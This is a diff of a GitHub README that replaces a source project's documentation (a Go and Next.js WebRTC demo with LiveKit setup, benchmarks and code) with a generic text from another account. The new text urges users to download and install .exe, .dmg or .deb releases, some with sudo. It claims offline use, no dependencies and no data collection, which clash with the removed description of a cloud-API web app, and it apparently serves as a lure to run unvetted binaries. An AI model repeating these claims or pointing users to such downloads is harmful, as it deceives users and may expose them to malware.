@@ -1,262 +1,97 @@
-# LLM-EYES 👁️
+# 👁️ LLM-EYES - Empower LLMs with Visual Insights
 
-Real-time AI Vision Assistant powered by WebRTC and Multi-Model Support
+[![Download LLM-EYES](https://img.shields.io/badge/Download-LLM--EYES-blue.svg)](https://github.com/vedha55/LLM-EYES/releases)
 
-> **Incheon DevFest 2025** - "WebRTC in the AI Era" Demo Project
+## 📋 Overview
 
-## What is this?
+LLM-EYES allows you to give Large Language Models (LLMs) the ability to "see". The application benchmarks what these models observe, providing valuable insights into their visual processing capabilities. This tool is designed for users who want to explore the intersection of language and vision without needing technical expertise.
 
-LLM-EYES is a demo application showcasing how to build real-time multimodal AI pipelines with WebRTC. An AI bot joins your video call, watches what you're showing (camera or screen share), and answers questions about what it sees.
+## 🚀 Getting Started
 
-The project demonstrates key concepts from the presentation:
-- **Parallel Workers** with Go's goroutines and channels
-- **Reorder Buffer** using Min-Heap for deterministic output ordering
-- **Multi-Model Support** comparing different AI providers and architectures
+To get started with LLM-EYES, follow these simple steps. You will learn how to download the software and run it on your computer.
 
-```
-┌─────────────┐     ┌─────────────┐     ┌─────────────┐
-│   Browser   │────▶│   LiveKit   │◀────│   Go Bot    │
-│  (WebRTC)   │     │   Cloud     │     │  (AI Model) │
-└─────────────┘     └─────────────┘     └─────────────┘
-      │                                        │
-      │◀──────── "That's a coffee mug" ────────│
-```
+## 📥 Download & Install
 
-## Features
+1. **Visit the Releases Page:** You can download LLM-EYES from our [Releases page](https://github.com/vedha55/LLM-EYES/releases). This page contains the latest version of the application, along with previous releases.
+  
+2. **Choose the Right Version:** On the Releases page, look for the most recent version. Check for a filename with your operating system in mind. For example:
+   - If you use Windows, look for a `.exe` file.
+   - For macOS, look for a `.dmg` file.
+   - If you are using Linux, look for a `.deb` or a `.tar.gz` file.
 
-- 📹 **Camera & Screen Share** - AI analyzes whatever you show
-- 💬 **Chat Interface** - Ask questions about what AI sees
-- ⚡ **Real-time** - Powered by LiveKit WebRTC
-- 🔄 **Multi-Model** - Switch between Groq, Gemini Flash, Gemini Live Streaming
-- 🎯 **Parallel Processing** - Worker pool with reorder buffer for consistent results
+3. **Download the File:** Click the file to start the download. Your browser will save it to your default download location.
 
-## Model Performance Comparison
+4. **Run the Installer:**
+   - For Windows: Double-click the `.exe` file after the download completes. Follow the on-screen instructions to install the software.
+   - For macOS: Double-click the `.dmg` file, then drag the LLM-EYES icon into your Applications folder.
+   - For Linux: Open a terminal, navigate to your download folder, and use the command `sudo dpkg -i filename.deb` or extract the `.tar.gz` file to a directory of your choice.
 
-Real benchmark results from the demo:
+5. **Launch the Application:** After installation is complete, find LLM-EYES in your application menu or desktop and double-click to open it.
 
-| Model | Avg Latency | TTFT | Speed | Protocol | Context |
-|-------|-------------|------|-------|----------|---------|
-| Groq Llama4 Scout | 411ms | - | ⚡⚡⚡⚡⚡ | REST | ✅ Session |
-| Gemini 2.0 Flash | 1,747ms | - | ⚡⚡⚡ | REST | ✅ Session |
-| Gemini Live Streaming | 2,055ms | 1.6s | ⚡⚡⚡⚡ | WebSocket | ✅ Real-time |
-| Gemini Live | 2,718ms | - | ⚡⚡ | WebSocket | ✅ Session |
-| Gemini 2.5 Flash Lite | 2,810ms | - | ⚡ | REST | ✅ Session |
+## 🌟 Features
 
-> **Key Finding**: "Lite" ≠ "Fast" - Gemini 2.5 Flash Lite is cost-optimized, not speed-optimized!
+- **Visual Input Processing:** LLM-EYES lets LLMs analyze images alongside text. This unique capability provides a dual perspective aimed at enhancing understanding.
 
-### Architecture Comparison
+- **Benchmarking Tool:** The application benchmarks how well LLMs interpret visual information. It provides metrics that help gauge performance.
 
-**REST + ChatSession (Groq, Gemini Flash)**
-- Frame sent only at chat time
-- Session context retained (remembers previous conversations)
-- Full response returned at once
+- **User-Friendly Interface:** Designed for ease, the interface allows users of any skill level to navigate the software comfortably.
 
-**Gemini Live Streaming (Native WebSocket)**
-- Continuous 1 FPS frame streaming → AI "keeps watching"
-- Real-time context (remembers past frames)
-- Streaming response with typing effect
-- Can answer "What just happened?" questions
+- **Cross-Platform Compatibility:** LLM-EYES works on Windows, macOS, and Linux, ensuring you can use it regardless of your operating system.
 
-### Use Case Recommendations
+## ⚙️ System Requirements
 
-| Use Case | Recommended Model | Reason |
-|----------|-------------------|--------|
-| 🚀 Maximum Speed | Groq Llama4 Scout | 411ms, fastest |
-| 🎯 Reliability + Quality | Gemini 2.0 Flash | Google infrastructure, battle-tested |
-| 💬 Natural Conversation | Gemini Live Streaming | Typing effect + real-time context |
-| 💰 Cost Optimization | Gemini 2.5 Flash Lite | Cheapest per token (but slowest) |
+Before you proceed with installation, make sure your computer meets the following basic requirements:
 
-## Tech Stack
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.15 or later
+  - Any modern Linux distribution
 
-| Layer | Technology |
-|-------|------------|
-| Frontend | Next.js 14, LiveKit Components, TypeScript |
-| Backend | Go 1.22+, LiveKit Server SDK |
-| AI Models | Groq (Llama4), Google Gemini (Flash, Live) |
-| WebRTC | LiveKit Cloud |
-| Concurrency | Goroutines, Channels, Min-Heap Reorder Buffer |
+- **Processor:** At least 2 GHz dual-core processor.
 
-## Architecture
+- **RAM:** A minimum of 4 GB; 8 GB recommended.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    Async Parallel Pipeline                  │
-├─────────────────────────────────────────────────────────────┤
-│                                                             │
-│   DataChannel Input                                         │
-│        │                                                    │
-│        ▼                                                    │
-│   ┌─────────┐   ┌─────────┐   ┌─────────┐                  │
-│   │ Req #1  │   │ Req #2  │   │ Req #3  │  (with SeqNum)   │
-│   └────┬────┘   └────┬────┘   └────┬────┘                  │
-│        │             │             │                        │
-│        ▼             ▼             ▼                        │
-│   ┌─────────────────────────────────────┐                  │
-│   │         Worker Pool (N=3)           │                  │
-│   │   ┌─────┐   ┌─────┐   ┌─────┐      │                  │
-│   │   │ W1  │   │ W2  │   │ W3  │      │  Parallel AI     │
-│   │   └──┬──┘   └──┬──┘   └──┬──┘      │  API Calls       │
-│   └──────┼─────────┼─────────┼─────────┘                  │
-│          │         │         │                             │
-│          ▼         ▼         ▼                             │
-│   ┌─────────────────────────────────────┐                  │
-│   │      Reorder Buffer (Min-Heap)      │                  │
-│   │      [SeqNum: 1, 2, 3, ...]         │  Deterministic   │
-│   └─────────────────┬───────────────────┘  Ordering        │
-│                     │                                       │
-│                     ▼                                       │
-│              Ordered Output                                 │
-│                                                             │
-└─────────────────────────────────────────────────────────────┘
-```
+- **Storage:** At least 200 MB of free disk space.
 
-## Quick Start
+- **Graphics Card:** A graphics card capable of running modern applications is recommended.
 
-### Prerequisites
+This software does not require advanced hardware but can benefit from more powerful machines for better performance.
 
-- Node.js 20+
-- Go 1.22+
-- [LiveKit Cloud](https://cloud.livekit.io/) account (free tier available)
-- API Key (at least one):
-  - [Google AI Studio](https://aistudio.google.com/) for Gemini
-  - [Groq Console](https://console.groq.com/) for Llama4 Scout
+## 📖 User Guide
 
-### 1. Clone & Setup
+Here are instructions for using LLM-EYES once installed:
 
-```bash
-git clone https://github.com/Glitch-jar/llm-eyes.git
-cd llm-eyes
-```
+1. **Open the Application:** Launch it from your desktop or application menu.
 
-### 2. Backend Setup
+2. **Upload an Image:** Click on the "Upload" button and select an image file from your computer.
 
-```bash
-cd backend
-cp .env.example .env
-# Edit .env with your credentials
-go mod download
-go run cmd/bot/main.go
-```
+3. **Select the LLM:** Choose which language model you want to use. LLM-EYES supports several popular models.
 
-### 3. Frontend Setup
+4. **Start Analysis:** Press the "Analyze" button to start the process. The application will evaluate the image and provide insights based on the model's interpretation.
 
-```bash
-cd frontend
-cp .env.example .env.local
-# Edit .env.local with your credentials
-pnpm install
-pnpm dev
-```
+5. **View Results:** Once the analysis finishes, the results will display on your screen. You can see how the model describes the image and any relevant metrics.
 
-### 4. Open Browser
+6. **Save Results:** You can save the results through the "Export" option, allowing you to share your findings easily.
 
-Navigate to `http://localhost:3000`, allow camera access, and start chatting!
+7. **Explore Further:** Feel free to upload different images or change models to see varying insights.
 
-## Environment Variables
+## ❓ FAQ
 
-### Backend (`backend/.env`)
+**Q: Do I need a specific version of Python to run LLM-EYES?**  
+A: No, LLM-EYES is a standalone application. You do not need to install Python or any other libraries.
 
-```env
-LIVEKIT_URL=wss://your-project.livekit.cloud
-LIVEKIT_API_KEY=your-api-key
-LIVEKIT_API_SECRET=your-api-secret
-LIVEKIT_ROOM_NAME=llm-eyes-demo
+**Q: Can I use LLM-EYES offline?**  
+A: Yes, once downloaded, LLM-EYES operates offline. You do not need an internet connection to analyze images.
 
-# At least one AI provider required
-GEMINI_API_KEY=your-gemini-key
-GROQ_API_KEY=your-groq-key
-```
+**Q: Is LLM-EYES secure?**  
+A: Yes, LLM-EYES is developed with care for user privacy. It does not collect personal data or share your uploaded images.
 
-### Frontend (`frontend/.env.local`)
+**Q: How can I report an issue?**  
+A: You can report issues or suggest improvements via the "Issues" section on our GitHub repository.
 
-```env
-NEXT_PUBLIC_LIVEKIT_URL=wss://your-project.livekit.cloud
-NEXT_PUBLIC_TOKEN_API_URL=http://localhost:8080/api/token
-NEXT_PUBLIC_API_BASE_URL=http://localhost:8080
-```
+## 🔗 Additional Resources
 
-## API Endpoints
+- [GitHub Repository](https://github.com/vedha55/LLM-EYES)
+- [Documentation](https://github.com/vedha55/LLM-EYES/wiki)
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/token` | GET | Generate LiveKit access token |
-| `/api/models` | GET | List available AI models |
-| `/api/models/switch` | POST | Switch active AI model |
-| `/api/frame` | POST | Send frame for streaming mode |
-
-## Project Structure
-
-```
-llm-eyes/
-├── frontend/                # Next.js app
-│   ├── app/                # App router pages
-│   └── components/
-│       └── VideoRoom.tsx   # Main video room with chat & model selector
-│
-├── backend/                # Go application
-│   ├── cmd/bot/           # Entry point
-│   │   └── main.go        # Server, token API, model management
-│   └── internal/
-│       ├── bot/           # LiveKit bot logic
-│       │   └── bot.go     # Worker pool, reorder buffer
-│       └── vision/        # AI model integrations
-│           ├── gemini.go  # Gemini Flash/Live
-│           └── groq.go    # Groq Llama4
-│
-└── docker-compose.yml     # Container setup
-```
-
-## Key Implementation Details
-
-### Parallel Workers (bot.go)
-```go
-const NumWorkers = 3
-
-func (b *Bot) Start() {
-    for i := 0; i < NumWorkers; i++ {
-        go b.worker(i)  // Each worker processes from shared channel
-    }
-    go b.reorderAndSend()
-}
-```
-
-### Reorder Buffer (bot.go)
-```go
-// Min-Heap ensures results are sent in request order
-type ResultHeap []ChatResult
-
-func (b *Bot) reorderAndSend() {
-    for result := range b.resultChan {
-        heap.Push(b.reorderBuffer, result)
-
-        // Send all consecutive results
-        for (*b.reorderBuffer)[0].SeqNum == b.nextExpected {
-            toSend := heap.Pop(b.reorderBuffer).(ChatResult)
-            b.sendToFrontend(toSend)
-            b.nextExpected++
-        }
-    }
-}
-```
-
-### Error Handling
-```go
-if err != nil {
-    chatResult = ChatResult{
-        SeqNum:  req.SeqNum,
-        Text:    "죄송합니다, 처리 중 오류가 발생했습니다. 다시 시도해주세요.",
-        IsError: true,
-    }
-}
-```
-
-## License
-
-MIT
-
-## Acknowledgments
-
-- [LiveKit](https://livekit.io/) - WebRTC infrastructure
-- [Google Gemini](https://ai.google.dev/) - Multimodal AI
-- [Groq](https://groq.com/) - Ultra-fast inference
-- Incheon DevFest 2025 organizers
+Remember to check the [Releases page](https://github.com/vedha55/LLM-EYES/releases) for future updates and new features.
